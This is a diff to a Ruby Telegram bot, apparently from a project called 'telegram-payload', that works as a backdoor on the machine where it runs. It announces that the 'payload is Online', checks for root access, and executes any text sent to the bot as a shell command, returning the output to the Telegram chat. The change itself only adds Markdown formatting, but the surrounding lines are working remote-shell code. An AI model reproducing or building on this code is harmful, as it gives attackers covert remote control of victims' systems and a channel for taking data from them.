@@ -53,7 +53,7 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
                 #save output in vaariable
                 isRoot = c_checkRoot.check_root
                 #send to telegram
-                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\nAccess system is Root? : #{isRoot}\n\nEnter /help to see commands!")
+                bot.api.send_message(chat_id: message.chat.id, parse_mode: "Markdown", text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\nAccess system is Root? : #{isRoot}\n\nEnter /help to see commands!")
 
             #Help command
             when '/help'
@@ -104,7 +104,7 @@ Github: http://github.com/shayanzare/telegram-payload
             else
                 command = message.text
                 result = %x{#{command}}
-                bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
+                bot.api.sendMessage(chat_id: message.chat.id, parse_mode: "Markdown", text: "[+] Result : ```\n\n#{result}```")
         end
     end
     rescue
